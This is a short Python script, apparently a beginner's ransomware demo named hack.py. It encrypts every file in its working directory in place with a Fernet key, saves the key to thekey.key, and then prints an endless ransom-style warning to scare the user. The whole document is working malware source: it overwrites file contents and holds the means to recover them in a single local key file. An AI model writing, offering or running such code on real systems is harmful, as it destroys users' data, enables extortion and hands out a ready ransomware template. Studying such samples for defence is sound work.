#!/usr/bin/env python

# importing modules
from cryptography.fernet import Fernet
import os

files = []

# loop to find each file and append them to our empty list "files"
for file in os.listdir():
    if file == "hack.py" or file == "thekey.key":
        continue

    files.append(file)

print(files)

# Fernet command to generate key
# (note capitalize the 'F' of Fernet otherwise it will not run)
key = Fernet.generate_key()

# making and writing in the key file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# encrypting the data of files present in the directory
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()

    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

# optional - infinite loop to scare the user
while True:
    print("Your device has been attacked by ransomware")
